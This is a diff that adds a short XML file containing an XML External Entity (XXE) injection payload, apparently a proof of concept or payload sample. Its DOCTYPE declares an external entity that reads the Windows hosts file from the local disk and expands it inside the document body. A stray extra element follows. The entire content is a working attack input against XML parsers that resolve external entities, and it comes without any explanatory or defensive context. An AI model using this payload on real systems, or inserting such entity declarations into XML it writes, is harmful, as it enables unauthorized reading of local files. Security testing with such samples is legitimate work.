@@ -1,0 +1,6 @@
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<foo>&xxe;</foo>
+<bhautik>abcd</bhautik>
